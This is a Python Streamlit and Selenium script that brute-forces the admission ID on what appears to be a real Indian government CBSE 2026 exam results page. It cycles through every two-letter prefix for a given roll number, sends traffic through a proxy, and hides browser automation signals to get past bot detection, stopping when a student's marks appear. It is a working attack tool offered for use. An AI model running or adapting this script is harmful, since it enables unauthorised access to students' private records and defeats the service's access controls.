import streamlit as st
import os, time, string
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# ========================= CONFIGURATION =========================
URL = "https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html"

def get_driver(proxy_str):
    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1280,1024")
    
    # 1. PROXY INJECTION
    # Using the HTTP proxy you provided
    if proxy_str:
        options.add_argument(f'--proxy-server={proxy_str}')
    
    # 2. STEALTH & USER-AGENT
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
    options.add_argument(f"user-agent={ua}")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    
    render_bin = "/opt/render/project/src/.render/chrome/opt/google/chrome/google-chrome"
    if os.path.exists(render_bin):
        options.binary_location = render_bin
    
    driver = webdriver.Chrome(options=options)
    
    # Remove 'webdriver' flag via CDP
    driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})"
    })
    
    return driver

def check_for_success(driver):
    try:
        page_source = driver.page_source.lower()
        success_keys = ["marks", "statement", "subject", "total", "grade", "pass"]
        if any(key in page_source for key in success_keys):
            return True, "Found Success Keywords"
        if len(driver.find_elements(By.ID, "rroll")) == 0:
            return True, "Redirected (Login gone)"
        err_msg = driver.find_elements(By.ID, "err_msg")
        if err_msg and err_msg[0].is_displayed():
            if "no data" in err_msg[0].text.lower():
                return False, "Fail: No data found"
    except: pass
    return False, "Inconclusive"

# ========================= STREAMLIT UI =========================
st.set_page_config(page_title="Proxy Stealth Recovery", layout="wide")
st.title("🛡️ CBSE Recovery (Proxy Mode)")

col1, col2 = st.columns([1, 2])
with col1:
    roll_val = st.text_input("Roll Number", "18615899")
    suffix_val = st.text_input("Suffix", "994511")
    proxy_input = st.text_input("Proxy (IP:Port)", value="4.213.167.178:80")
    delay = st.slider("Wait for page (sec)", 1.0, 5.0, 2.5)
    start_btn = st.button("🚀 Start Search")

with col2:
    st.subheader("Live Browser View")
    log_window = st.container(border=True)
    debug_image = st.empty()

if start_btn:
    driver = None
    try:
        log_window.write(f"⏳ Connecting via Proxy: {proxy_input}...")
        driver = get_driver(proxy_input)
        
        letters = string.ascii_uppercase
        combos = [f"{a}{b}" for a in letters for b in letters]
        
        for i, prefix in enumerate(combos):
            full_id = f"{prefix}{suffix_val}"
            
            # Navigate
            try:
                driver.get(URL)
                
                # Check for 403 immediately
                if "403" in driver.title or "forbidden" in driver.page_source.lower():
                    log_window.error(f"🚫 IP Blocked! Proxy {proxy_input} failed.")
                    debug_image.image(driver.get_screenshot_as_png(), caption="Blocked Screen")
                    break
                
                # Smart Wait for Form
                wait = WebDriverWait(driver, 10)
                roll_in = wait.until(EC.presence_of_element_located((By.ID, "rroll")))
                
                roll_in.send_keys(roll_val)
                driver.find_element(By.ID, "admn_id").send_keys(full_id)
                driver.find_element(By.ID, "submit").click()
                
                time.sleep(delay)
                
                debug_image.image(driver.get_screenshot_as_png(), caption=f"Testing {full_id}")
                
                is_hit, reason = check_for_success(driver)
                if is_hit:
                    log_window.success(f"💎 MATCH FOUND: {full_id}")
                    st.balloons()
                    break
                
            except Exception as e:
                debug_image.image(driver.get_screenshot_as_png(), caption="Error View")
                log_window.write(f"⚠️ Skipping {full_id}: Form not ready.")
                continue

    except Exception as e:
        st.error(f"System Error: {e}")
    finally:
        if driver:
            driver.quit()
